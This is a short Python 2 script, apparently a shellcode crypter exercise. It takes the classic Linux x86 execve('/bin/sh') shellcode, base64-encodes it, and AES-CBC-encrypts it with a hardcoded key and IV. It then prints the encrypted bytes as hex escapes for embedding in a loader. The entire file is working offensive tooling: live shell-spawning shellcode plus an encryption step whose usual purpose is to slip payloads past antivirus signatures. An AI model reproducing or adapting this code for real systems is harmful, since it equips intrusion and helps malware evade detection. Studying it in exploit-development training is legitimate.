from Crypto.Cipher import AES
import sys
import base64

def base64enc(plaintext):
    b64enc = base64.b64encode(plaintext)
    return b64enc

def encrypt(plaintext):
    obj=AES.new("th1s_1s_s3cretC0de187652", AES.MODE_CBC, "s0meIVkeywh1ch1s")
    l=len(plaintext)
    r=l%16
    p=16-r
    print "offset: " + str(p)
    plain = plaintext+"A"*p
    ciph=obj.encrypt(plain)
    encoded=""
    for x in bytearray(ciph):
        encoded += '\\x'
        enc = '%02x' % x
        encoded += enc  
    print encoded

def main():
    plaintext = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
    b64enc = base64enc(plaintext)
    print ("Encoding...: %s" % b64enc)
    encrypt(b64enc)

if __name__ == '__main__':
    main()
